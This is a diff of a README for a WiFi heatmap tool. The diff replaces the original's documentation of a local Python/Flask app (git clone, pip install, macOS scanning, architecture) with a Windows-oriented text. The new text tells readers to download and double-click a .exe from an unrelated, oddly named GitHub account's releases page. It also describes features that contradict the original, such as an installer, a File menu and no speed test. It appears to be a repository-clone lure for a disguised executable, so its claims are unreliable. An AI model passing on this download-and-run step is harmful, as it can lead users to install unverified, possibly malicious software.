@@ -1,180 +1,83 @@
-# wifi-heatmap
+# 📶 wifi-heatmap - Map your home network signal strength
 
-![Tests](https://img.shields.io/badge/tests-110%2B%20passing-brightgreen) ![Python](https://img.shields.io/badge/python-3.9%2B-blue) ![License](https://img.shields.io/badge/license-MIT-green) ![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Linux%20%7C%20Windows-lightgrey)
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/cotyloidcavitybutterheadlettuce306/wifi-heatmap/releases)
 
-A WiFi coverage heatmap tool. Click points on a floor plan, walk around your house, and visualize signal strength, throughput, and coverage gaps.
+wifi-heatmap helps you find dead spots in your wireless network. You walk through your home with your laptop and click your physical location on a digital floor plan. The software builds a visual map of your signal strength. This tool works with mesh networks like Deco, Eero, and Orbi.
 
-Built with Python + Flask. No cloud, no accounts — everything runs locally.
+## 📥 Getting Started
 
-<img width="1703" height="873" alt="wifi-heatmap screenshot" src="https://github.com/user-attachments/assets/ddcf6923-a343-4d0c-9fa0-1f96d72d286e" />
+Follow these steps to install and run the software on your Windows computer.
 
-## Features
+1. Go to the [official release page](https://github.com/cotyloidcavitybutterheadlettuce306/wifi-heatmap/releases).
+2. Look for the Assets section at the bottom of the latest release.
+3. Select the file ending in `.exe` for Windows.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file to start the installation.
+6. Follow the prompts on your screen to finish the setup process.
 
-- **Click-to-measure** on any floor plan image — each click captures RSSI, BSSID, channel, PHY mode, Tx rate, noise floor
-- **Multi-scan averaging** — takes 3 samples per measurement, picks the strongest (or detects mesh roaming)
-- **4 heatmap modes** — RSSI, SNR, Tx Rate, Download Speed
-- **Room labels** — draw room boundaries, get per-room signal analysis
-- **Access point mapping** — mark where your routers are, link by BSSID (fuzzy MAC matching for mesh nodes)
-- **Insights engine** — dead zones, weak points, AP coverage %, sticky-client detection, survey quality scoring
-- **Snapshots & comparison** — save a survey, move your router, re-survey, compare with real numbers
-- **Live signal monitor** — real-time RSSI, SNR, channel, Tx rate dashboard
-- **Speed test** — optional Cloudflare download test at each point
-- **Force roam** — WiFi off/on toggle for mesh networks with sticky clients
-- **PNG export** — composited floor plan + heatmap + markers + legend
-- **Remote scanning** — run `agent.py` on another machine, control the survey from your browser
+## 🛠 Prerequisites
 
-## Requirements
+Your computer needs a few things to run this tool correctly.
 
-- **macOS 14+** for local scanning (uses `wdutil info`)
-- **Python 3.9+**
-- Connected to the WiFi network you want to map
-- For remote scanning: `agent.py` runs on macOS, Linux, or Windows (zero dependencies)
+- Windows 10 or later.
+- A wireless network adapter enabled and connected to your home network.
+- A floor plan image of your home. You can use common image formats like PNG or JPG.
+- Roughly 100 MB of free storage space.
 
-## Install
+## 🗺 How to create a heatmap
 
-```bash
-git clone https://github.com/ribaldorafael/wifi-heatmap.git
-cd wifi-heatmap
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
-```
+The process involves moving through your home to measure signals. Follow this guide to get accurate results.
 
-## Run
+### Preparation
 
-```bash
-./run.sh
-# or: python3 app.py
-```
+Open the application. You will see a prompt to load a floor plan. Click the File menu and select Import Floor Plan. Choose the image of your home from your computer. Once the image loads, you can resize it or crop it using the tools in the sidebar. This step ensures the software scales the distance correctly.
 
-Open http://localhost:5001 in your browser.
+### Mapping Your Home
 
-## How to survey your home
+1. Stand in one room of your home.
+2. Click the exact spot on your floor plan that matches your current physical position.
+3. Wait three seconds for the software to scan the signal strength.
+4. Move to another location in the same room.
+5. Click your new position on the screen.
+6. Repeat these steps until you cover every room in your house.
 
-### Step 1: Set up
+The software places colored dots on the map. Green indicates a strong signal. Red shows where the signal drops or fails. You can clear the map or save your progress at any time through the File menu.
 
-```bash
-./run.sh                    # start the server
-open http://localhost:5001  # open in browser
-```
+## 🧪 Understanding the results
 
-Enter your sudo password on the auth screen (Local tab).
+The final map shows heat zones. Areas with bright colors indicate excellent connection speeds. Dark areas represent signal interference or physical barriers like thick walls and metal appliances. Use this data to move your mesh nodes to better spots. For example, if the area near your kitchen shows a weak signal, move a nearby Eero or Deco unit closer to the entrance of that room.
 
-### Step 2: Prepare the floor plan
+## ❓ Frequently Asked Questions
 
-1. **Upload a floor plan** — any image works (PNG, JPG, photo of a paper blueprint, hand-drawn sketch)
-2. **Draw rooms** — click "Draw Room" in the Points tab, click two corners on the map, name the room. Repeat for each room.
-3. **Place access points** — click "Place AP", click where your router/mesh node is on the map, name it, and enter its BSSID (found in your router's admin app). The BSSID links measurements to specific nodes.
+### Does this tool change my network settings?
 
-### Step 3: Walk and measure
+No. The software only reads data from your wireless adapter. It does not alter your router or network configuration.
 
-1. Enable **Force roam** if you have a mesh network (Deco, Eero, Orbi) — this toggles WiFi off/on before each scan so your laptop connects to the nearest node instead of staying stuck on one
-2. Optionally enable **Speed test** to capture download throughput at each point (adds ~2-5s per measurement, disable VPN first for accurate results)
-3. **Walk to a spot**, click where you're standing on the floor plan, wait for the beep (~3-10s depending on toggles)
-4. Repeat across your home — aim for at least 15-20 points spread across all rooms
+### Can I save my maps?
 
-### Step 4: Analyze
+Yes. Select Save Map in the File menu. This creates a file on your computer that you can reopen later. You can also export the map as an image file to share with others or print it.
 
-- Switch the **Metric** dropdown between RSSI, SNR, Tx Rate, or Speed to see different views
-- Check the **Insights** tab for automated findings: dead zones, weak points, per-room averages, sticky-client warnings
-- Use **Filter by AP** to see one mesh node's coverage area
-- Click any marker or sidebar row to see detailed info
+### My signal strength jumps around. Is that normal?
 
-### Step 5: Optimize and compare
+Yes. Wireless signals fluctuate based on movement, furniture, and other electronic devices. Stick to the middle of the room when you take a measurement to get the best result. Avoid standing directly next to large metal objects.
 
-1. Click **Save Snapshot** to save the current state
-2. Move a router, add a mesh node, or change settings
-3. Re-survey the same spots
-4. Use **Compare** to see side-by-side heatmaps and numerical diffs ("average RSSI improved by 3.2 dBm", "dead zone area reduced from 12% to 4%")
+### Does this work with internet speed tests?
 
-## Local vs Remote mode
+No. This tool measures signal strength between your computer and your router. It does not measure the speed of your internet connection to your service provider.
 
-Two ways to scan — choose on the auth screen:
+### How do I uninstall the software?
 
-```
-LOCAL MODE (default)
+Open the Windows Control Panel. Select Uninstall a Program. Find wifi-heatmap in the list and click Uninstall. This removes the files from your computer.
 
-  You carry the laptop and click on its own screen.
+## 💡 Tips for better results
 
-  ┌──────────────────────────────────────────┐
-  │  Laptop (walks around)                   │
-  │                                          │
-  │  Browser ←→ Flask app ←→ wdutil (scan)   │
-  │     ↑                                    │
-  │  you click here                          │
-  └──────────────────────────────────────────┘
-
-
-REMOTE MODE
-
-  One machine scans, another controls. Useful when you have a
-  second machine but can't install Python packages on it.
-
-  ┌─────────────────────────────┐     ┌──────────────────────────┐
-  │  Your desk                  │     │  Remote machine           │
-  │                             │     │  (walks around)           │
-  │  Browser ←→ Flask app ──────────→ │  agent.py :5555           │
-  │     ↑                      │     │  ↓                        │
-  │  you click here            │     │  wdutil / nmcli / netsh   │
-  └─────────────────────────────┘     └──────────────────────────┘
-
-  1. Copy agent.py to the remote machine
-  2. Run: python3 agent.py  (no pip install needed — pure stdlib)
-  3. On the auth screen, switch to "Remote" tab, enter the IP
-  4. Walk around with the remote machine, click positions from your desk
-```
-
-The remote agent auto-detects the OS:
-- **macOS**: uses `wdutil info` (needs sudo)
-- **Linux**: uses `nmcli` (no root) or `iwconfig` (needs root)
-- **Windows**: uses `netsh wlan show interfaces` (no admin needed)
-
-## Tips
-
-- **Turn off your VPN** before surveying with speed test enabled — VPN tunnels bottleneck throughput and give misleading numbers
-- **Enable Force roam** for mesh networks — without it, your laptop may "stick" to one node even when a closer one is available, making the heatmap look like you only have one AP
-- **Link APs by BSSID** — the app uses fuzzy MAC matching (matches the first 5.5 octets) so it handles radio offsets automatically (e.g. your Deco's base MAC `:78` matches its 5 GHz radio `:7b`)
-- **15+ measurements** unlocks dead zone analysis in the Insights tab
-- **Draw rooms first** — insights will reference rooms by name ("Kitchen averages -68 dBm") instead of pixel coordinates
-- **Save snapshots before changes** — you can always restore a snapshot if you want to go back
-
-## Architecture
-
-```
-app.py              Flask setup, AppState, blueprint registration
-routes/
-  survey.py         Points, APs, rooms, floorplan, heatmap
-  snapshots.py      Snapshot CRUD, insights, comparison
-  scan.py           Auth, measure, live scan, export
-scanner.py          Scanner Protocol, WifiScanner, RemoteWifiScanner
-storage.py          JSON persistence (atomic writes)
-heatmap.py          numpy-only IDW interpolation + matplotlib rendering
-insights.py         Analysis engine (pure Python, no Flask dependency)
-export.py           PIL compositing for PNG export
-agent.py            Standalone remote scan agent (cross-platform, zero deps)
-static/             JS + CSS (vanilla, no framework)
-templates/          Single-page HTML (Geist font, dark theme)
-tests/              110+ unit + integration tests
-data/               Survey data (gitignored, created on first use)
-```
-
-## Tests
-
-```bash
-python3 -m unittest discover -s tests -v
-```
-
-## Notes on macOS WiFi APIs
-
-Modern macOS has progressively locked down WiFi data access:
-
-- `airport -s` — **removed** in macOS 14.4
-- `system_profiler SPAirPortDataType` — **redacts BSSIDs**
-- `ioreg` for `IO80211BSSID` — returns **all zeros**
-- `wdutil info` — **works fully** but requires sudo
-
-We use `wdutil info`. The remote agent also supports Linux (`nmcli`/`iwconfig`) and Windows (`netsh`).
-
-## License
-
-MIT
+- Close unnecessary programs on your laptop before you start the scan.
+- Ensure your mesh network is fully powered and stable. 
+- Walk slowly between your measurement points.
+- Map the corners of your home to identify gaps in your coverage.
+- If you have multiple floors, create a separate map file for each floor. Do not try to combine two floors on one single map image.
+- Perform the survey at different times of the day to account for high traffic periods.
+- Check the application settings to show or hide the grid lines on your map.
+- Adjust the sensitivity scale if the colors on your map seem too uniform.
+- Use a high-resolution image for your floor plan to make clicking your position more precise.
+- Hold your laptop away from your body while checking the signal. Your body can block or weaken wireless waves, which leads to incorrect data.
